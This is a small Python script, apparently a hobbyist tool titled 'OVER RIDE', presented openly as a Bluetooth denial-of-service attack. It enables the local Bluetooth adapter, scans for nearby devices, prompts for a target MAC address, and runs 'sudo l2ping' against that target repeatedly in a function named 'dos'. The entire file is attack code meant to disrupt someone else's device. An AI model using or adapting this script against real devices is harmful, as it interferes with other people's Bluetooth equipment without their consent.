import subprocess
import time

print("""
 ██████╗ ██╗   ██╗███████╗██████╗     ██████╗ ██╗██████╗ ███████╗
██╔═══██╗██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║██╔══██╗██╔════╝
██║   ██║██║   ██║█████╗  ██████╔╝    ██████╔╝██║██║  ██║█████╗  
██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██╔══██╗██║██║  ██║██╔══╝  
╚██████╔╝ ╚████╔╝ ███████╗██║  ██║    ██║  ██║██║██████╔╝███████╗
 ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝
 
By dsxz19-2
Copywrite dsxz19-2
""")

def scan():
        print("[+] Enabling bluetooth...")
        subprocess.run(["sudo", "hciconfig", "hci0", "up"])
        print("[+] Done!")
        print("[+] Scanning for MAC address...")
        subprocess.run(["hcitool", "scan"])
        print("[+] Done!")
def dos(MACaddress):
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
try:
    scan()
    target = input("[+] Enter target MAC address: ")
    dos(target)
except KeyboardInterrupt:
        print("Quitting attack...")
